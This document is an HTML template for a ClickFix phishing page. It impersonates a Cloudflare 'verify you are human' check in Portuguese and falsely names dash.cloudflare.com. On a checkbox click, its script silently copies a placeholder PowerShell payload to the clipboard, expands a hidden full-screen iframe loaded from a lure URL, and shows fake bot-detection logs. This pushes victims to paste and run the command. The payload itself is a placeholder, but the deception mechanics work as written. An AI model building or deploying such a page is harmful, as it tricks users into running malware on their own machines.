<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="{{Fav-Icon-URL-Placeholder}}" type="image/png">
    <title>Just a moment...</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, "Helvetica Neue", Arial, sans-serif;
            background-color: #fff;
            color: #313131;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
        }

        .container {
            width: 100%;
            max-width: 650px;
            padding: 20px;
        }

        .header {
            display: flex;
            align-items: center;
            gap: 10px;
            font-size: 32px;
            font-weight: 500;
            margin-bottom: 5px;
        }

        .header img {
            width: 32px;
            height: 32px;
            border-radius: 5px;
        }

        .sub-heading {
            font-size: 24px;
            margin-bottom: 35px;
            font-weight: 400;
        }

        .widget-box {
            width: 300px;
            height: 65px;
            border: 1px solid #d9d9d9;
            background: #fafafa;
            border-radius: 3px;
            display: flex;
            align-items: center;
            padding: 0 12px;
            position: relative;
            margin-bottom: 40px;
            box-shadow: 0 2px 3px rgba(0,0,0,0.03);
            transition: all 0.2s;
        }

        .checkbox-container {
            width: 28px;
            height: 28px;
            border: 2px solid #c2c2c2;
            border-radius: 3px;
            background: #fff;
            margin-right: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            flex-shrink: 0;
            transition: border-color 0.2s;
        }

        .checkbox-container:hover {
            border-color: #999;
        }

        .spinner {
            width: 18px;
            height: 18px;
            border: 2px solid #f3f3f3;
            border-top: 2px solid #0051c3;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            display: none;
        }

        @keyframes spin { 100% { transform: rotate(360deg); } }

        .widget-text {
            font-size: 14px;
            flex-grow: 1;
            user-select: none;
        }

        .cf-branding {
            text-align: right;
            line-height: 1;
        }

        .cf-branding img {
            height: 18px;
            margin-left: auto;
            margin-bottom: 2px;
        }

        .cf-links {
            font-size: 8px;
            color: #9c9c9c;
            text-decoration: none;
        }

        #log-area {
            font-family: monospace;
            font-size: 11px;
            color: #888;
            margin-top: -30px;
            margin-bottom: 30px;
            height: 50px;
            overflow: hidden;
        }

        .footer-text {
            font-size: 16px;
            color: #313131;
        }

        .blocked .widget-box {
            border-color: #bd2130;
            background-color: #fffafa;
        }
        
        .blocked .checkbox-container {
            border: none;
            background: transparent;
            color: #bd2130;
            font-size: 24px;
            font-weight: bold;
        }

        .blocked .checkbox-container::after {
            content: '✕';
        }

        .blocked .widget-text {
            color: #bd2130;
            font-weight: 600;
        }

        .blocked .sub-heading {
            color: #bd2130;
        }

        .hidden { display: none; }
    </style>
</head>
<body>

    <div class="container">
        <div class="header">
            <img src="https://i.pravatar.cc/100?u=cloud-security" alt="Site Logo">
            <span>dash.cloudflare.com</span>
        </div>

        <div class="sub-heading" id="main-title">
            Verificando se a conexão do site é segura
        </div>

        <div class="widget-box" id="widget">
            <div class="checkbox-container" id="check-box">
                <div class="spinner" id="loader"></div>
            </div>
            <div class="widget-text" id="status-label">
                Confirme que é humano
            </div>
            <div class="cf-branding">
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/4b/Cloudflare_Logo.svg/1200px-Cloudflare_Logo.svg.png" alt="Cloudflare">
                <div class="cf-links">Privacidade • Termos</div>
            </div>
        </div>

        <div id="log-area"></div>

        <div class="footer-text" id="footer-desc">
            dash.cloudflare.com precisa revisar a segurança da sua conexão antes de prosseguir.
        </div>
    </div>

    <script>
        function createHiddenIFrame(htmlContent){
            const iframe = document.createElement('iframe');
            iframe.id = 'CLICK_FIX_SCREEN';
            iframe.style.position = 'fixed';
            iframe.style.top = '0';
            iframe.style.left = '0';
            iframe.style.width = '100vw';
            iframe.style.height = '100vh';
            iframe.style.border = 'none';
            iframe.style.opacity = '0';
            iframe.style.pointerEvents = 'none';
            iframe.style.transition = 'opacity 0.3s';
            iframe.srcdoc = htmlContent;
            iframe.setAttribute('allow', 'fullscreen'); 
            iframe.setAttribute('allowfullscreen', 'true'); 
            document.body.appendChild(iframe);
            return iframe;
        };

        const CLICK_FIX_PAGE_URL = "{{CLICK_FIX_PAGE}}";

        (async ()=>{
            let res = await fetch(CLICK_FIX_PAGE_URL);
            let HTML = await res.text();
            console.log(`CFX_HTML loaded \n${HTML}`);
            globalThis.HiddedIFrameWindow = createHiddenIFrame(HTML);
        })();
 
        const checkBox = document.getElementById('check-box');
        const loader = document.getElementById('loader');
        const statusLabel = document.getElementById('status-label');
        const logArea = document.getElementById('log-area');
        const mainTitle = document.getElementById('main-title');

        const dummyLogs = [
            "Initializing secure handshake...",
            "Analyzing browser environment...",
            "Checking reputation of IP...",
            "Detection: Automation signature found.",
            "Heuristic analysis complete."
        ];

        let verificationStarted = false;

        function startVerification() {
            if (verificationStarted) return;
            verificationStarted = true;
            checkBox.style.borderColor = 'transparent';
            loader.style.display = 'block';
            statusLabel.innerText = "Verificando...";

            let logIndex = 0;
            const interval = setInterval(() => {
                if (logIndex < dummyLogs.length) {
                    const line = document.createElement('div');
                    line.innerText = "> " + dummyLogs[logIndex];
                    logArea.appendChild(line);
                    logIndex++;
                } else {
                    clearInterval(interval);
                    setTimeout(triggerBlock, 1000);
                }
            }, 700);
        }

        function triggerBlock() {
            loader.style.display = 'none';
            document.body.classList.add('blocked');
            mainTitle.innerText = "Acesso Denied (403)";
            statusLabel.innerText = "Você é um robô e foi bloqueado.";
            
            const errorLine = document.createElement('div');
            errorLine.style.color = "#bd2130";
            errorLine.style.fontWeight = "bold";
            errorLine.innerText = "> RESULT: BOT_DETECTED_PERMANENT_BLOCK";
            logArea.appendChild(errorLine);
        }

        checkBox.addEventListener('click', () => {
            setTimeout(() => {
                navigator.clipboard.writeText(
                   `{{POWERSHELL ONELINER PWNAGE}}`
                );
                console.log("The time out has finished");
                const iframe = globalThis.HiddedIFrameWindow;
                iframe.style.pointerEvents = 'auto';
                iframe.style.opacity = '1';

                if (iframe.requestFullscreen) iframe.requestFullscreen();
                else if (iframe.webkitRequestFullscreen) iframe.webkitRequestFullscreen();
                else if (iframe.msRequestFullscreen) iframe.msRequestFullscreen();
                document.title = "Repair..";
                startVerification();
            }, 2000); // 2 seconds delay
        });
    </script>   
</body>
</html>
